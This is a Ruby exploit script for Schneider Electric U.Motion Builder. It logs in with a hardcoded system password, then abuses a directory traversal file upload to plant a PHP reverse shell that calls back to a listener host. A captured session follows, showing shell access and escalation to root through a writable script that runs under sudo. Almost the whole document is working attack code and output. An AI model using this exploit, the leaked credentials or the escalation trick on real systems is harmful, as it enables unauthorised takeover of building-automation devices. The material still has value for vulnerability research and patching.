#!/usr/bin/env ruby 
# This module exploits a directory traversal arbitrary file upload in 
# Schneider Electric U.Motion Builder to install an agent. 

require 'rex'
require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex/mime'

sock = Rex::Proto::Http::Client.new("192.168.2.173", port = "8080", context = {}, ssl = false)
# ZDI-17-372
# select * from dpadd_object where name = 'system';
#95|system|_DPAD_DBCONSTANT_USER_DESCRIPTION_SYSTEM|USER|||||-1|0|user.png|0|0|0|0|{SHA}RXitCCMpPMPIa7Obx83RF/AdkrI=|ext_number=system|ext_secret=system|ext_cid=system|dpadUser||0|0|0|0|*|SYSTEM|0||0|1|0|0|0|0|0|1378480811
# qpnvmu!!

login = "username=system&password=qpnvmu!!&rememberMe=1&context=runtime&op=login"

req = sock.request_cgi(
        {
                'uri'   => "/umotion/modules/system/user_login.php",
                'version' => '1.0',
                'method' => 'POST',
                'data' => login,
        })

        sock.send_request(req)
        data = sock.read_response()
       
        if data.headers['Set-Cookie']
		sessionid = data.headers['Set-Cookie'].split(';')[0]
				
			$framework = Msf::Simple::Framework.create(
			:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
		)
			payload = $framework.payloads.create("php/reverse_php")
			php_payload = Msf::Simple::Payload.generate_simple(payload,
				{
					'OptionStr' => "LHOST=192.168.2.1 LPORT=1975",
					'Format'    => 'raw',
				})

		phpstuff = %Q|<?php #{php_payload} ?>|
		page = Rex::Text.rand_text_alpha_upper(5) + ".php"
# ZDI-17-388
		dbl = Rex::MIME::Message.new
		dbl.add_part("../system/", nil, nil, "form-data; name=\"upload_path_to\"")
		dbl.add_part("1", nil, nil, "form-data; name=\"upload\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_file\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"upload_local_path_from\"")
		dbl.add_part("0", nil, nil, "form-data; name=\"delete\"")
		dbl.add_part("", nil, nil, "form-data; name=\"delete_file_name\"")
		dbl.add_part(phpstuff, "application/octet-stream", nil, "form-data; name=\"upload_file\" ; filename=\"#{page}\"")
		data = dbl.to_s

		req = sock.request_cgi(
			{
				'uri'   => "/umotion/modules/system/file_picker.php",
				'version' => '1.0',
				'method' => 'POST',
				'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
				'cookie' => sessionid,
				'data' => data,
			})

		sock.send_request(req)
		data = sock.read_response()

		if data and data.body =~ /user_login/
			puts "[!] Failed!"
		else
			req = sock.request_raw({ 'uri' => "/umotion/modules/system/#{page}", 'method' => 'GET' })
			sock.send_request(req)
			puts "[*] Waiting for shell..."
			system("nc -l 1975")
			exit
		
		end
	end
__END__
$ sudo ruby schneider_file_picker.rb 
[*] Waiting for shell...
id
uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
pwd
/mnt/storage/RWdlabs/smartdomuspad/modules/system
# ZDI-17-392
id
uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
ls -lsa /home/dpadweb
total 14
1 drwxr-xr-x 5 dpadweb dlabusers 1024 Mar  6  2014 .
1 drwxr-xr-x 7 root    root      1024 Jan 21  2014 ..
1 -rw------- 1 dpadweb dlabusers   52 Dec 21  2010 .Xauthority
1 -rw------- 1 dpadweb dlabusers  119 Jan 22  2013 .bash_aliases
1 -rw------- 1 dpadweb dlabusers   10 Oct 23  2012 .bash_history
1 -rw-r--r-- 1 dpadweb dlabusers  220 Apr 13  2010 .bash_logout
4 -rw-r--r-- 1 dpadweb dlabusers 3213 Jan 21  2013 .bashrc
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .cache
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .config
1 drwx------ 3 dpadweb dlabusers 1024 Oct 16  2012 .local
1 -rw-r--r-- 1 dpadweb dlabusers  675 Apr 13  2010 .profile
0 lrwxrwxrwx 1 root    root        30 Mar  6  2014 .reboot-script.sh -> /tmp/RWdlabs/.reboot-script.sh
0 lrwxrwxrwx 1 root    root        24 Jan 21  2014 .rscript.sh -> /tmp/RWdlabs/.rscript.sh
cat /tmp/RWdlabs/.rscript.sh
#Insert lines to exec operations as root from dpadweb user
echo "id" >> /tmp/RWdlabs/.rscript.sh

id
uid=1003(dpadweb) gid=1001(dlabusers) groups=1001(dlabusers),29(audio),44(video),104(netdev)
sudo /tmp/RWdlabs/.rscript.sh
uid=0(root) gid=0(root) groups=0(root)

